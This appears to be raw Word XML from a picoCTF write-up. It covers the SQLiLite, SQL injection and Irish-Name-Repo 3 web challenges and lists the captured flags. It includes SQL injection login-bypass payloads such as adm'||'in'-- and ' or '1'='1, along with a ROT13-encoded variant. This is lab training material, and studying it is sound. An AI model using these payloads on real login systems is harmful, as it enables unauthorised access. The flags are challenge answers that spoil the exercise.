          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>adm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Courier New"/>
          <w:color w:val="DD1144"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>'||'in' AND password='' | '' IS NOT ''</w:t>
      </w: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247C89CC"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 xml:space="preserve">Which happens to be exactly 25 characters long. Navigate to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>filter.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> to find the flag afterwards.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BF26FB" w14:textId="77777777" w:rsidR="00E54DC9" w:rsidRPr="00E54DC9" w:rsidRDefault="00E54DC9" w:rsidP="00E54DC9">
      <w:pPr>
        <w:spacing w:after="135" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>br</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A186332" w14:textId="64874916" w:rsidR="00E54DC9" w:rsidRDefault="00E54DC9" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="350BB4DF" w14:textId="1D26ADB9" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C1965F0" w14:textId="77777777" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="00DA1864">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>SQLiLite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2568A518"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3A925BC4" w14:textId="77777777" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="00DA1864">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BD74413" w14:textId="77777777" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="00DA1864">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2C5B4686" w14:textId="77777777" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="00DA1864">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4AD504E" w14:textId="16ECBDEE"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login to this </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>website?Try</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> to login </w:t>
      </w:r>
      <w:hyperlink r:id="rId138"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304942D0" w14:textId="2D4FDF7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lastRenderedPageBreak/>
        <w:t>Username:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA1864">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>adm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>'||'in'--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE793DE" w14:textId="0120956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p>
    <w:p w14:paraId="5A0F42AA" w14:textId="7ACCE720" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="00DA1864">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21CBC0A5" wp14:editId="20AA43E6">
            <wp:extent cx="5936494" cy="2659610"/>
            <wp:effectExtent l="0" t="0" r="762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39"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5936494" cy="2659610"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE35C75" w14:textId="1651491B" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="476E5E0F" wp14:editId="0EF4428F">
            <wp:extent cx="6332220" cy="112649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40"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1126490"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E73530" w14:textId="21F04D67" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AD63DEA" w14:textId="3B66C18D" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DA1864">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DA1864">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701C246C" w14:textId="02AE3A26" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28992986" w14:textId="466C325B" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="00EA3443">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1</w:t>
      </w:r>
      <w:r w:rsidR="003F18E9">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">                  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003F18E9">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003F18E9">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16DACA61"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 | 300 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6292B6C4" w14:textId="77777777" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="00EA3443">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317A5AA4" w14:textId="77777777" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="00EA3443">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CHRIS HENSLER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF40C76" w14:textId="77777777" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="00EA3443">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68EDE43" w14:textId="63CC8F5E"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website running at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/33850/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId141"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http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A50275" w14:textId="3598E627" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="00EA3443">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We can see the menu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F98178" w14:textId="77C2277F" w:rsidR="00AC1BAC" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5391B5E8" wp14:editId="53C2EB1A">
            <wp:extent cx="777240" cy="861167"/>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42"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="779094" cy="863221"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E723848" w14:textId="2F8521E0" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21715842" wp14:editId="4A63EBF4">
            <wp:extent cx="6332220" cy="210058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43"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2100580"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E3B49D" w14:textId="0908E908" w:rsidR="00AC1BAC" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>It is a SQL database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E089F6" w14:textId="4DCE8DDE" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="518CA2C5" wp14:editId="1B4D5056">
            <wp:extent cx="5867908" cy="3635055"/>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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5867908" cy="3635055"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="082557A4" w14:textId="649F4781" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4D870DA2" wp14:editId="5122DDA9">
            <wp:extent cx="4877223" cy="1623201"/>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45"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4877223" cy="1623201"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FA9742" w14:textId="243394AE" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{s0m3_SQL_f8adf3fb}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375648FA" w14:textId="043A663B" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26653A76" w14:textId="77777777" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="000A034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Irish-Name-Repo 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14809131"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234ED3DA" w14:textId="77777777" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="000A034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2221DE0" w14:textId="77777777" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="000A034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XINGYANG PAN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E0DF63" w14:textId="77777777" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="000A034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AE6979A" w14:textId="77777777" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="000A034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There is a secure website running at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/54253/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId146" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>link</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F709CE1" w14:textId="2B2AB3E5" w:rsidR="00EA3443" w:rsidRDefault="000A0346" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Hint: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Seems like the password is encrypted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204427B1" w14:textId="71B3806C" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E52A83F" w14:textId="35B1FE8E"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087F64CE" wp14:editId="565B2E6E">
            <wp:extent cx="6332220" cy="323786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47"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3237865"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A71262D" w14:textId="41D27F37" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="436725EA" w14:textId="6726600A" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="463F5E43" w14:textId="63245E40" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6A6CEC57" wp14:editId="09E64CFE">
            <wp:extent cx="6332220" cy="173672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48"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1736725"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05409D03" w14:textId="1BB45062" w:rsidR="000A0346" w:rsidRDefault="000A0346"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The hint is the password is encrypted. It is R</w:t>
      </w:r>
      <w:r w:rsidR="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>OT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>13 encryption</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC9789A" w14:textId="5533FC50"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or ‘1’=’1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46636440" w14:textId="03F502CE"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SELECT * FROM admin where password = 'a' or '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69794737" w14:textId="25C0DB14"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highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>n' be '1'='1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A15D89" w14:textId="12B4B327"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password=n' be '1'='1&amp;debug=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C7E690" w14:textId="6DE50F68" w:rsidR="00BE6BB7" w:rsidRDefault="00BE6BB7" w:rsidP="00BE6BB7">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="078CF49B" w14:textId="77777777" w:rsidR="00BE6BB7" w:rsidRPr="00BE6BB7" w:rsidRDefault="00BE6BB7" w:rsidP="00BE6BB7">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
